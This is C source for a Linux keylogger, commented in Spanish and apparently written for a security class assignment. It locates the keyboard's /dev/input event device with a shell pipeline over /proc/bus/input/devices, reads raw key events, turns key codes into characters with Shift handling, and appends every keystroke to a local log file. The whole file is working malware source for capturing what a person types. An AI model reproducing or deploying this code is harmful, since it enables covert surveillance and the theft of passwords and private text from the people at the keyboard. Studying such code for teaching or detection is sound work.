#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <linux/input.h>
#include <sys/stat.h>
#include <string.h>
#include <stdlib.h>
#include <errno.h>

#define LOGFILEPATH "/home/kevin/Descargas/TareaSeguridad/keylogger.txt" // Define la ruta del archivo de registro donde se guardarán las teclas presionadas

char *getEvent(); //Obtiene el nombre del dispositivo de teclado.
char mapKey(int code, int shiftPressed); // Mapea el código de una tecla a su representación en texto.

int main(){
    struct input_event ev;   
    static char path_keyboard[20] = "/dev/input/";  // Define un buffer estático para la ruta del dispositivo de entrada.
    strcat(path_keyboard, getEvent());  // Obtiene el número del evento del teclado y lo concatena a la ruta base.
    path_keyboard[strlen(path_keyboard) - 1] = 0;  

    int device_keyboard = open(path_keyboard, O_RDONLY);  // Abre el dispositivo de teclado en  solo lectura.
    if (device_keyboard < 0) {  // Si hay error
        perror("Error");  // Muestra un mensaje de error.
        return 1;  // Termina el programa por error.
    }

    FILE *fp = fopen(LOGFILEPATH, "a");  // Abre el archivo de registro en modo añadir.
    if (!fp) {  
        perror("Error");  // Error.
        close(device_keyboard);  // Cierra el dispositivo de teclado.
        return 1;  // Termina el programa por error.
    }

    int shiftPressed = 0;  // Variable para rastrear si Shift está presionado.

    while (1) {  // Bucle infinito para leer eventos del teclado.
        read(device_keyboard, &ev, sizeof(ev));  // Lee un evento del dispositivo de teclado.

        if (ev.type == EV_KEY) {  // Si el evento es  tecla
            if (ev.value == 1 || ev.value == 2) {  // Si la tecla es presionada o mantenida...
                if (ev.code == KEY_LEFTSHIFT || ev.code == KEY_RIGHTSHIFT) {  
                    shiftPressed = 1;  // Marca que Shift está presionado.
                }
            } else if (ev.value == 0) {  // Si shit es liberado
                if (ev.code == KEY_LEFTSHIFT || ev.code == KEY_RIGHTSHIFT) {  
                    shiftPressed = 0;  // Marca que Shift está liberado.
                } else {  // Para otras teclas...
                    char key = mapKey(ev.code, shiftPressed);  // Obtiene el carácter correspondiente considerando el estado de Shift.
                    if (key) {  
                        fputc(key, fp);  
                        fflush(fp);  // Fuerza la escritura inmediata en el archivo.
                    }
                }
            }
        }
    }

    fclose(fp);  
    close(device_keyboard);  
    return 0;  
}


char *getEvent(){
    static char event[8];  
    FILE *pipe = popen("cat /proc/bus/input/devices | grep -C 5 keyboard | grep -E -o 'event[0-9]'", "r");  // Ejecuta un comando de shell para encontrar el evento del teclado.
    if (!pipe)
        exit(1);  // Si hay un error al abrir el pipe, termina el programa.

    fgets(event, 8, pipe);  // Lee el número del evento del pipe.
    pclose(pipe);  // Cierra el pipe.
    return event;  
}


char mapKey(int code, int shiftPressed) {
    if (shiftPressed) { // Con SHift
        switch (code) {
            case KEY_A: return 'A';
            case KEY_B: return 'B';
            case KEY_C: return 'C';
            case KEY_D: return 'D';
            case KEY_E: return 'E';
            case KEY_F: return 'F';
            case KEY_G: return 'G';
            case KEY_H: return 'H';
            case KEY_I: return 'I';
            case KEY_J: return 'J';
            case KEY_K: return 'K';
            case KEY_L: return 'L';
            case KEY_M: return 'M';
            case KEY_N: return 'N';
            case KEY_O: return 'O';
            case KEY_P: return 'P';
            case KEY_Q: return 'Q';
            case KEY_R: return 'R';
            case KEY_S: return 'S';
            case KEY_T: return 'T';
            case KEY_U: return 'U';
            case KEY_V: return 'V';
            case KEY_W: return 'W';
            case KEY_X: return 'X';
            case KEY_Y: return 'Y';
            case KEY_Z: return 'Z';
            case KEY_1: return '!';
            case KEY_2: return '@';
            case KEY_3: return '#';
            case KEY_4: return '$';
            case KEY_5: return '%';
            case KEY_6: return '^';
            case KEY_7: return '&';
            case KEY_8: return '*';
            case KEY_9: return '(';
            case KEY_0: return ')';
            case KEY_SPACE: return ' ';
            case KEY_ENTER: return '\n';
            case KEY_BACKSPACE: return '\b';
            default: return 0;
        }
    } else { // SIn SHIFT
        switch (code) {
            case KEY_A: return 'a';
            case KEY_B: return 'b';
            case KEY_C: return 'c';
            case KEY_D: return 'd';
            case KEY_E: return 'e';
            case KEY_F: return 'f';
            case KEY_G: return 'g';
            case KEY_H: return 'h';
            case KEY_I: return 'i';
            case KEY_J: return 'j';
            case KEY_K: return 'k';
            case KEY_L: return 'l';
            case KEY_M: return 'm';
            case KEY_N: return 'n';
            case KEY_O: return 'o';
            case KEY_P: return 'p';
            case KEY_Q: return 'q';
            case KEY_R: return 'r';
            case KEY_S: return 's';
            case KEY_T: return 't';
            case KEY_U: return 'u';
            case KEY_V: return 'v';
            case KEY_W: return 'w';
            case KEY_X: return 'x';
            case KEY_Y: return 'y';
            case KEY_Z: return 'z';
            case KEY_1: return '1';
            case KEY_2: return '2';
            case KEY_3: return '3';
            case KEY_4: return '4';
            case KEY_5: return '5';
            case KEY_6: return '6';
            case KEY_7: return '7';
            case KEY_8: return '8';
            case KEY_9: return '9';
            case KEY_0: return '0';
            case KEY_SPACE: return ' ';
            case KEY_ENTER: return '\n';
            case KEY_BACKSPACE: return '\b';
            default: return 0; // Devuelve 0 para teclas no mapeadas.
        }
    }
}
